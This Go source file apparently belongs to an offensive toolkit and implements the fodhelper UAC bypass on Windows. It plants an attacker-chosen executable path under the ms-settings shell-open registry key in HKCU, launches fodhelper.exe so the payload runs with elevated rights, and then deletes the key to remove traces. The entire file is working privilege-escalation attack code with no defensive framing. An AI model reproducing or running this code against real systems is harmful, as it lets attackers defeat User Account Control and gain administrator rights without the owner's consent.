package models

import (
	"fmt"
	"time"

	"golang.org/x/sys/windows/registry"
)

func Fodhelper_registry(File_path string) {
	fmt.Println(Version())
	subkey, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell\open\command`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		fmt.Printf("[-] CreateKey err: %v", err)
		return
	}
	subkey.SetStringValue("", File_path)
	subkey.SetStringValue("DelegateExecute", "")
	subkey.Close()
	WindowsRun("C:\\windows\\system32\\fodhelper.exe")
	time.Sleep(time.Second * 3)
	DeleteSubKeyTree("ms-settings")
	fmt.Println("[+] Fo Done")
}
